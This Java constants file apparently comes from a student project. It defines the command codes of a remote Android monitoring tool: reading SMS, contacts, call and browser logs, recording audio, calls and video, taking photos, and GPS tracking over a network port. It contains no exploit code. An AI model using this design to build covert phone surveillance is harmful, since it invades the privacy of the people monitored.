package es.unex.giiis.tfg.protocol;

public class Protocol {
	// VARIABLES COMUNES
	public final static int TAM_BUFFER = 1024;
	public final static int PUERTO = 4455;
	public final static int TIME_REFRESH = 10000;
	public final static int TIME_SLEEP = 5000;
	public final static String PATH_BASE = "/Users/luciofondon/Desktop/T.F.G./workspace/workspace_web";
	public final static String IMEI = "imei";
	public final static String USER_NAME_LOGIN = "user_login";
	public final static String KEY1 = "key1";

	// VARIABLES PARA MENSAJES SMS (0-99)
	public final static int READ_LOG_SMS = 1;
	public final static int SEND_SMS = 2;
	public final static int READ_LOG_SMS_RECIBIDOS = 3;
	public final static int READ_LOG_SMS_BORRADORES = 4;
	public final static int READ_LOG_SMS_ENVIADOS = 5;
	public final static int LISTENER_SMS = 6;

	// VARIABLES PARA AUDIO (100-199)
	public final static int START_RECORD_AUDIO = 100;
	public final static int START_RECORD_AUDIO_SAVE = 101;
	public final static int STOP_RECORD_AUDIO = 102;
	public final static int LISTENER_AUDIO = 103;

	// VARIABLES PARA IMAGEN (200-299)
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_ON = 200;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_OFF = 201;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_AUTO = 202;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_TORCH = 203;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_RED_EYE = 205;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_ON_SAVE = 206;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_OFF_SAVE = 207;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_AUTO_SAVE = 208;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_TORCH_SAVE = 209;
	public final static int TAKE_PHOTO_PRIMARY_FLASH_MODE_RED_EYE_SAVE = 210;
	public final static int TAKE_PHOTO_SECUNDARY_FLASH_MODE_OFF = 211;
	public final static int TAKE_PHOTO_SECUNDARY_FLASH_MODE_OFF_SAVE = 212;
	public final static int READ_IMAGE_GALLERY_5 = 213;
	public final static int READ_IMAGE_GALLERY_10 = 214;
	public final static int READ_IMAGE_GALLERY_15 = 215;
	public final static int LISTENER_IMAGE_GALLERY = 216;
	public final static int LISTENER_IMAGE_CAMERA = 217;

	// VARIABLES PARA VIDEO (300-399)
	public final static int START_RECORD_VIDEO_PRIMARY_FLASH_MODE_OFF = 300;
	public final static int START_RECORD_VIDEO_PRIMARY_FLASH_MODE_TORCH = 301;
	public final static int START_RECORD_VIDEO_PRIMARY_FLASH_MODE_AUTO = 302;
	public final static int START_RECORD_VIDEO_PRIMARY_FLASH_MODE_OFF_SAVE = 303;
	public final static int START_RECORD_VIDEO_PRIMARY_FLASH_MODE_TORCH_SAVE = 304;
	public final static int START_RECORD_VIDEO_PRIMARY_FLASH_MODE_AUTO_SAVE = 305;
	public final static int START_RECORD_VIDEO_SECUNDARY = 306;
	public final static int START_RECORD_VIDEO_SECUNDARY_SAVE = 307;
	public final static int STOP_RECORD_VIDEO = 308;
	public final static int LISTENER_VIDEO = 309;

	// VARIABLES PARA LA AGENDA DE CONTACTO (400-499)
	public final static int READ_LOG_CONTACT = 400;
	public final static int LISTENER_CONTACT = 401;

	// VARIABLES PARA LLAMADAS (500-599)
	public final static int READ_LOG_CALL = 500;
	public final static int DO_CALL = 501;
	public final static int LISTENER_CALL = 502;
	public final static int LISTENER_CALL_RECORD = 503;

	// VARIABLES PARA RECURSOS (600-699)
	public final static int TAKE_RESOURCE = 600;
	public final static int READ_RESOURCE = 601;
	public final static int LISTENER_TAKE_RESOURCE = 602;
	public final static int LISTENER_READ_RESOURCE = 604;

	// VARIABLES PARA NAVEGADOR WEB (700-799)
	public final static int READ_LOG_BROWSER = 700;
	public final static int LISTENER_BROWSER = 799;

	// VARIABLES PARA DISPOSITIVO (800-899)
	public final static int SINCRONIZE = 800;
	public final static int LISTENER_SINCRONIZE = 801;

	// VARIABLES PARA BALIZA (900-999)
	public final static int START_BEACON_GPS_30 = 901;
	public final static int START_BEACON_GPS_1 = 902;
	public final static int START_BEACON_GPS_5 = 903;
	public final static int START_BEACON_GPS_10 = 904;
	public final static int START_BEACON_NETWORK_30 = 905;
	public final static int START_BEACON_NETWORK_1 = 906;
	public final static int START_BEACON_NETWORK_5 = 907;
	public final static int START_BEACON_NETWORK_10 = 908;
	public final static int START_BEACON_PASSIVE_30 = 909;
	public final static int START_BEACON_PASSIVE_1 = 910;
	public final static int START_BEACON_PASSIVE_5 = 911;
	public final static int START_BEACON_PASSIVE_10 = 912;
	public final static int STOP_BEACON_GPS = 913;
	public final static int STOP_BEACON_NETWORK = 914;
	public final static int STOP_BEACON_PASSIVE = 915;
	public final static int ENABLED_GPS = 916;
	public final static int LISTENER_BEACON = 917;

	// NOMBRES DE LOS DTO
	public final static String TYPE_CALLDTO = "CallDTO";
	public final static String TYPE_SMSDTO = "SmsDTO";
	public final static String TYPE_IMAGEDTO = "ImageDTO";
	public final static String TYPE_BEACONDTO = "BeaconDTO";
	public final static String TYPE_BROWSERDTO = "BrowserDTO";
	public final static String TYPE_DEVICEDTO = "DeviceDTO";
	public final static String TYPE_AUDIODTO = "AudioDTO";
	public final static String TYPE_CONTACTDTO = "ContactDTO";
	public final static String TYPE_VIDEODTO = "VideoDTO";
	public final static String TYPE_RESOURCEDTO = "ResourceDTO";
	public final static String TYPE_USERDTO = "UserDTO";

	// ************************************************

	// VARIABLES PARA EL PROTOCOLO HTTP
	public final static int LISTENER_PICTURE = 801;
	public final static int LISTENER_GPS = 804;
	public final static int LISTENER_GALLERY = 805;
	public final static int LISTENER_SCREEN = 808;

	public final static int LISTENER_ON_POWER = 900;
	public final static int LISTENER_OFF_POWER = 901;
	public final static int LISTENER_ON_WIFI = 902;
	public final static int LISTENER_OFF_WIFI = 903;
	public final static int LISTENER_ON_GPS = 904;
	public final static int LISTENER_OFF_GPS = 905;
	public final static int LISTENER_ON_DATOS = 906;
	public final static int LISTENER_OFF_DATOS = 907;

	// NOMBRES CARPETA CREACIÓN
	public final static String DIR_IMAGEN = "Imagen";
	public final static String DIR_AUDIO = "Audio";
	public final static String DIR_VIDEO = "Video";
	public final static String IP = "ip";
	public final static String CMD = "cmd";

	
	//http://gestdb.piensayactua.com/blog/?x=entry:entry131219-182331
	//Movil activar depuracion usb 
}
